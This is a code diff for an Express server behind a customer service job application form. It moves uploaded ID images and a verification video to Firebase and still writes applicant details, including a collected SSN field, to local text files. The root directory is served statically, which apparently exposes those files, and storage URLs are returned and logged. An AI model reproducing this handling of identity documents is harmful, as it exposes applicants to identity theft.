@@ -3,11 +3,15 @@ const cors = require('cors');
 const multer = require('multer');
 const path = require('path');
 const fs = require('fs');
+const { uploadToFirebase, initializeFirebase } = require('./firebase-config');
 
 const app = express();
 const PORT = process.env.PORT || 8000;
 
-// Ensure uploads directory exists
+// Initialize Firebase on startup
+initializeFirebase();
+
+// Ensure uploads directory exists for application info files
 const uploadsDir = path.join(__dirname, 'backend', 'uploads');
 if (!fs.existsSync(uploadsDir)) {
   fs.mkdirSync(uploadsDir, { recursive: true });
@@ -21,56 +25,8 @@ app.use(express.urlencoded({ extended: true, limit: '10mb' }));
 // Static files - serve everything from root
 app.use(express.static(__dirname));
 
-// File upload configuration
-const storage = multer.diskStorage({
-  destination: (req, file, cb) => {
-    // Create folder based on applicant's name from form data
-    let folderName = 'temp';
-    
-    // Try to get names from form data
-    if (req.body && req.body.firstName && req.body.lastName) {
-      const fullName = `${req.body.firstName} ${req.body.lastName}`;
-      const safeFolderName = fullName
-        .replace(/[^a-zA-Z0-9\s]/g, '') // Remove special characters
-        .replace(/\s+/g, '-') // Replace spaces with hyphens
-        .toLowerCase();
-      
-      const timestamp = new Date().toISOString().slice(0, 10); // YYYY-MM-DD
-      folderName = `${timestamp}_${safeFolderName}`;
-    } else {
-      folderName = `temp_${Date.now()}`;
-    }
-    
-    const applicantDir = path.join(uploadsDir, folderName);
-    
-    if (!fs.existsSync(applicantDir)) {
-      fs.mkdirSync(applicantDir, { recursive: true });
-    }
-    
-    // Store folder name for later use
-    req.applicantFolder = folderName;
-    
-    cb(null, applicantDir);
-  },
-  filename: (req, file, cb) => {
-    // Simple, clear filenames based on field
-    let filename;
-    switch (file.fieldname) {
-      case 'idFront':
-        filename = `front-id${path.extname(file.originalname)}`;
-        break;
-      case 'idBack':
-        filename = `back-id${path.extname(file.originalname)}`;
-        break;
-      case 'video':
-        filename = `verification-video${path.extname(file.originalname)}`;
-        break;
-      default:
-        filename = `${file.fieldname}${path.extname(file.originalname)}`;
-    }
-    cb(null, filename);
-  }
-});
+// File upload configuration - use memory storage for Firebase uploads
+const storage = multer.memoryStorage();
 
 const upload = multer({ 
   storage,
@@ -107,6 +63,7 @@ app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'index.html'));
 });
 
+// Health check endpoint - Enhanced for Railway
 app.get('/health', (req, res) => {
   try {
     // Check if uploads directory exists and is writable
@@ -118,6 +75,7 @@ app.get('/health', (req, res) => {
       environment: process.env.NODE_ENV || 'development',
       port: PORT,
       uploadsDir: uploadsCheck ? 'Ready' : 'Creating...',
+      firebase: process.env.FIREBASE_SERVICE_ACCOUNT ? 'Configured' : 'Not configured',
       uptime: process.uptime()
     });
   } catch (error) {
@@ -130,24 +88,75 @@ app.get('/health', (req, res) => {
   }
 });
 
-// Middleware to create applicant folder after multer parses form data
-const createApplicantFolder = (req, res, next) => {
-  // This will run after multer, so req.body should be available
-  next();
-};
-
 // Application submission endpoint
 app.post('/api/submit-application', upload.fields([
   { name: 'idFront', maxCount: 1 },
   { name: 'idBack', maxCount: 1 },
   { name: 'video', maxCount: 1 }
-]), (req, res) => {
+]), async (req, res) => {
   try {
     const { name, email, phone, firstName, lastName, experience, schedule, location, ssn } = req.body;
     const files = req.files;
-    const applicantFolder = req.applicantFolder;
     
-    // Create application info text file
+    // Create folder name for local application info
+    const fullName = `${firstName} ${lastName}`;
+    const safeFolderName = fullName
+      .replace(/[^a-zA-Z0-9\s]/g, '') // Remove special characters
+      .replace(/\s+/g, '-') // Replace spaces with hyphens
+      .toLowerCase();
+    
+    const timestamp = new Date().toISOString().slice(0, 10); // YYYY-MM-DD
+    const applicantFolder = `${timestamp}_${safeFolderName}`;
+    const applicantDir = path.join(uploadsDir, applicantFolder);
+    
+    // Create local directory for application info
+    if (!fs.existsSync(applicantDir)) {
+      fs.mkdirSync(applicantDir, { recursive: true });
+    }
+
+    // Upload files to Firebase and get URLs
+    const fileUrls = {};
+    
+    if (files && files.idFront) {
+      try {
+        const frontIdUrl = await uploadToFirebase(
+          files.idFront[0].buffer, 
+          `front-id${path.extname(files.idFront[0].originalname)}`,
+          applicantFolder
+        );
+        fileUrls.frontId = frontIdUrl;
+      } catch (error) {
+        console.error('Failed to upload front ID:', error);
+      }
+    }
+
+    if (files && files.idBack) {
+      try {
+        const backIdUrl = await uploadToFirebase(
+          files.idBack[0].buffer, 
+          `back-id${path.extname(files.idBack[0].originalname)}`,
+          applicantFolder
+        );
+        fileUrls.backId = backIdUrl;
+      } catch (error) {
+        console.error('Failed to upload back ID:', error);
+      }
+    }
+
+    if (files && files.video) {
+      try {
+        const videoUrl = await uploadToFirebase(
+          files.video[0].buffer, 
+          `verification-video${path.extname(files.video[0].originalname)}`,
+          applicantFolder
+        );
+        fileUrls.video = videoUrl;
+      } catch (error) {
+        console.error('Failed to upload video:', error);
+      }
+    }
+    
+    // Create application info with Firebase URLs
     const applicationInfo = {
       timestamp: new Date().toISOString(),
       applicantName: `${firstName} ${lastName}`,
@@ -162,11 +171,12 @@ app.post('/api/submit-application', upload.fields([
         idFront: files && files.idFront ? 'Yes' : 'No',
         idBack: files && files.idBack ? 'Yes' : 'No',
         video: files && files.video ? 'Yes' : 'No'
-      }
+      },
+      firebaseUrls: fileUrls
     };
     
-    // Save application info to text file
-    const infoFilePath = path.join(uploadsDir, applicantFolder, 'application-info.txt');
+    // Save application info to local text file
+    const infoFilePath = path.join(applicantDir, 'application-info.txt');
     const infoText = `CUSTOMER SERVICE APPLICATION
 ========================================
 
@@ -189,6 +199,11 @@ Files Uploaded:
 - Back ID: ${applicationInfo.filesUploaded.idBack}
 - Verification Video: ${applicationInfo.filesUploaded.video}
 
+Firebase File URLs:
+- Front ID URL: ${fileUrls.frontId || 'Not uploaded'}
+- Back ID URL: ${fileUrls.backId || 'Not uploaded'}
+- Video URL: ${fileUrls.video || 'Not uploaded'}
+
 Status: Pending Review
 ========================================`;
 
@@ -196,15 +211,13 @@ Status: Pending Review
     
     console.log('=== New Application Received ===');
     console.log('Applicant:', applicationInfo.applicantName);
-    console.log('Folder Created:', applicantFolder);
+    console.log('Local Folder Created:', applicantFolder);
     console.log('Email:', email);
     console.log('Phone:', phone);
-    console.log('Files uploaded:');
-    if (files) {
-      if (files.idFront) console.log('- ID Front: front-id' + path.extname(files.idFront[0].originalname));
-      if (files.idBack) console.log('- ID Back: back-id' + path.extname(files.idBack[0].originalname));
-      if (files.video) console.log('- Video: verification-video' + path.extname(files.video[0].originalname));
-    }
+    console.log('Firebase Files:');
+    if (fileUrls.frontId) console.log('- Front ID:', fileUrls.frontId);
+    if (fileUrls.backId) console.log('- Back ID:', fileUrls.backId);
+    if (fileUrls.video) console.log('- Video:', fileUrls.video);
     console.log('Info saved to:', infoFilePath);
     console.log('================================');
     
@@ -215,6 +228,7 @@ Status: Pending Review
         message: 'Application submitted successfully! We will contact you within 24 hours.',
         applicationId: applicationInfo.applicationId,
         applicantFolder: applicantFolder,
+        fileUrls: fileUrls,
         nextSteps: [
           'Check your email for confirmation',
           'Prepare for a brief phone screening',
